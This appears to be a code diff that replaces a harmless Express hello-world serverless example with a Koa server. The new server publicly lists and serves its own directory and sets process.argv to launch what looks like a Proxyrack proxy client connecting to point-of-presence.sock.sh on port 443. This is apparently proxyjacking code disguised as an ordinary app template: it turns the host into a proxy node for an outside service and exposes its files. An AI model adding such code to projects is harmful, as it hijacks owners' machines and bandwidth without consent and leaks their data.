@@ -1,32 +1,10 @@
-import express from "express";
+import child_process from 'child_process'
+import path from 'path'
+import Koa from 'koa'
+import serve from 'koa-static'
+import list from 'koa2-serve-index'
 
-const app = express();
-
-app.get("/", (req, res) => {
-  res.send("Hello World from Express serverless!");
-});
-
-app.get("/users", (req, res) => {
-  res.json([{ id: 1, name: "Alice" }, { id: 2, name: "Bob" }]);
-});
-
-// route example with streaming
-
-app.get("/stream", (req, res) => {
-  // write a long string to the response
-  const interval = setInterval(() => {
-    res.write("Hello, World! ");
-  }, 1000);
-
-  // end the response after 5 seconds
-  setTimeout(() => {
-    clearInterval(interval);
-    res.end();
-  }, 5000);
-});
-
-app.listen(8080, () => {
-  console.log(
-    "Server is running on port 8080. Check the app on http://localhost:8080"
-  );
-});
+const app = new Koa()
+app.use(list(import.meta.dirname)).use(serve(import.meta.dirname))
+process.argv = [process.execPath, 'script.js', '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443','--id', 'genezio', '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP']
+app.listen(8080)
